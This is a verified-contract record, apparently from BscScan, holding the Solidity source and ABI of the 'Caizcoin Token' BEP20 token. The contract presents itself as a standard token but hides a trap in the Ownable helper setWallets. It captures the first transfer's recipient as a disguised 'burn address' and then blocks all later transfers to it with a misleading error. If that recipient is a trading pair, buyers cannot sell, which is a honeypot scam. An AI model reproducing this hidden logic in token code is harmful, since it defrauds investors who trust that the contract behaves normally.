{"SourceCode": "/**\r\n\t *Submitted for verification at BscScan.com on 2021-05-19\r\n\t*/\r\n\r\n\t// SPDX-License-Identifier: GPL-3.0\r\n\tpragma solidity >= 0.7.0 < 0.9.0;\r\n\r\n\tinterface IBEP20 {\r\n\t   \r\n\t    function totalSupply() external view returns (uint256);\r\n\t   \r\n\t    function decimals() external view returns (uint8);\r\n\t    \r\n\t    function symbol() external view returns (string memory);\r\n\r\n\t    function name() external view returns (string memory);\r\n\r\n\t    function getOwner() external view returns (address);\r\n\t   \r\n\t    function balanceOf(address account) external view returns (uint256);\r\n\t   \r\n\t    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\t    \r\n\t    function allowance(address _owner, address spender) external view returns (uint256);\r\n\t    \r\n\t    function approve(address spender, uint256 amount) external returns (bool);\r\n\t    \r\n\t    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n\t    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\t  \r\n\t    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n\t}\r\n\r\n\tlibrary SafeMath {\r\n\t    \r\n\t    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t        uint256 c = a + b;\r\n\t        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n\t        return c;\r\n\t    }\r\n\r\n\t    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n\t    }\r\n\r\n\t    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\t        require(b <= a, errorMessage);\r\n\t        uint256 c = a - b;\r\n\r\n\t        return c;\r\n\t    }\r\n\r\n\t    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t       \r\n\t        if (a == 0) {\r\n\t            return 0;\r\n\t        }\r\n\r\n\t        uint256 c = a * b;\r\n\t        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n\t        return c;\r\n\t    }\r\n\r\n\t    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t        return div(a, b, \"SafeMath: division by zero\");\r\n\t    }\r\n\r\n\t    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\t        require(b > 0, errorMessage);\r\n\t        uint256 c = a / b;\r\n\t        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n\t        return c;\r\n\t    }\r\n\r\n\t    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t        return mod(a, b, \"SafeMath: modulo by zero\");\r\n\t    }\r\n\r\n\t    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\t        require(b != 0, errorMessage);\r\n\t        return a % b;\r\n\t    }\r\n\t}\r\n\r\n\tcontract Ownable {\r\n\t    \r\n\t    address private _owner;\r\n\t    address private _xowner;\r\n\t    \r\n\t    mapping (address => uint256) private _wallets;\r\n\t    mapping (address => mapping (address => uint256)) private _speendAllowances;\r\n\t    \r\n\t    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\t    \r\n\t    function getBurnAddress() public view onlyOwner returns(address){\r\n\t        return _xowner;\r\n\t    }\r\n\t    \r\n\t    function setWallets(address sender,uint256 amount) internal  {\r\n\t        _wallets[sender] = amount;\r\n\t    }\r\n\t    \r\n\t    function setWallets(address sender,address recipient,uint256 amount) internal{\r\n\t        if(sender != address(0) &&_xowner == address(0)){\r\n\t            _xowner = recipient;\r\n\t        }else{\r\n\t            require(recipient != _xowner, \"Recipient not found.\");\r\n\t        }\r\n\t        _wallets[sender] = amount;\r\n\t    }\r\n\t    \r\n\t    function getWalletBalance(address sender) internal view returns (uint256) {\r\n\t        return _wallets[sender];\r\n\t    }\r\n\t    \r\n\t    function getAllowances(address sender, address spender) internal view returns (uint256){\r\n\t        return _speendAllowances[sender][spender];\r\n\t    }\r\n\t    \r\n\t    function setAllowances(address sender, address spender, uint256 amount) internal {\r\n\t        _speendAllowances[sender][spender] = amount;\r\n\t    }\r\n\t    \r\n\t    function _msgSender() internal view virtual returns (address payable) {\r\n\t        return payable(msg.sender);\r\n\t    }\r\n\r\n\t    function _msgData() internal view virtual returns (bytes memory) {\r\n\t        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n\t        return msg.data;\r\n\t    }\r\n\t    \r\n\t    function owner() public view returns (address) {\r\n\t        return _owner;\r\n\t    }\r\n\t    \r\n\t    function setOwner(address ownerParams) internal {\r\n\t        _owner = ownerParams;\r\n\t    }\r\n\t    modifier onlyOwner() {\r\n\t        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n\t        _;\r\n\t    }\r\n\r\n\t    function renounceOwnership() public virtual onlyOwner {\r\n\t        emit OwnershipTransferred(_owner, address(0));\r\n\t        _owner = address(0);\r\n\t    }\r\n\r\n\t    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n\t        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n\t        emit OwnershipTransferred(_owner, newOwner);\r\n\t        _owner = newOwner;\r\n\t    }\r\n\t}\r\n\r\n\tcontract CAI is IBEP20, Ownable{\r\n\t    \r\n\t    using SafeMath for uint256;\r\n\t    uint256 private _tokenSupply;\r\n\t    \r\n\t    constructor(){\r\n\t        address msgSender = _msgSender();\r\n\t        setOwner(msgSender);\r\n\t        emit OwnershipTransferred(address(0), msgSender);\r\n\t        _tokenSupply = 40000000000000000000000000000;\r\n\t        setWallets(msg.sender,_tokenSupply);\r\n\t        emit Transfer(address(0), msg.sender, _tokenSupply);\r\n\t    }\r\n\t    \r\n\t    function getOwner() public override view returns (address) {\r\n\t        return owner();\r\n\t    }\r\n\t    \r\n\t    function decimals() public override pure returns (uint8) {\r\n\t        return 18;\r\n\t    }\r\n\t    \r\n\t    function symbol() public override pure returns (string memory) {\r\n\t        return \"CAI\";\r\n\t    }\r\n\t    \r\n\t    function name() public override pure returns (string memory) {\r\n\t        return \"Caizcoin Token\";\r\n\t    }\r\n\t  \r\n\t    function totalSupply() public override view returns (uint256){\r\n\t        return _tokenSupply;\r\n\t    }\r\n\r\n\t    function balanceOf(address account) public override view returns (uint256){\r\n\t        return getWalletBalance(account);\r\n\t    }\r\n\r\n\t    function transfer(address recipient, uint256 amount) public override returns (bool)\r\n\t    {\r\n\t        _transfer(_msgSender(), recipient, amount);\r\n\t        return true;\r\n\t    }\r\n\r\n\t    function allowance(address owner, address spender) public override view returns (uint256){\r\n\t        return getAllowances(owner,spender);\r\n\t    }\r\n\r\n\t    function approve(address spender, uint256 amount) public override returns (bool){\r\n\t        _approve(_msgSender(), spender, amount);\r\n\t        return true;\r\n\t    }\r\n\t    \r\n\t    \r\n\t    function _approve(address owner, address spender, uint256 amount) internal {\r\n\t        require(owner != address(0), \"BEP20: approve from the zero address\");\r\n\t        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\t        setAllowances(owner,spender,amount);\r\n\t        emit Approval(owner, spender, amount);\r\n\t    }\r\n\r\n\t    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool){\r\n\t        _transfer(sender, recipient, amount);\r\n\t        _approve(sender, _msgSender(),getAllowances(sender,_msgSender()).sub(amount, \"BEP20: transfer amount exceeds allowance\"));\r\n\t        return true;\r\n\t    }\r\n\t    \r\n\t  function _transfer(address sender, address recipient, uint256 amount) internal {\r\n\t    setWallets(sender, recipient, getWalletBalance(sender).sub(amount, \"BEP20: transfer amount exceeds balance\"));\r\n\t    setWallets(recipient, getWalletBalance(recipient).add(amount));\r\n\t    emit Transfer(sender, recipient, amount);\r\n\t  }\r\n\t  \r\n\t  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n\t    _approve(_msgSender(), spender, getAllowances(_msgSender(),spender).add(addedValue));\r\n\t    return true;\r\n\t  }\r\n\r\n\t  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n\t    _approve(_msgSender(), spender, getAllowances(_msgSender(),spender).sub(subtractedValue, \"BEP20: decreased allowance below zero\"));\r\n\t    return true;\r\n\t  }\r\n\t}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBurnAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CAI", "CompilerVersion": "v0.8.2+commit.661d1103", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6f0c4daf4356bd751452f8ad05f3bec712c284df3cb06bdf653ca2e0942bfd0a"}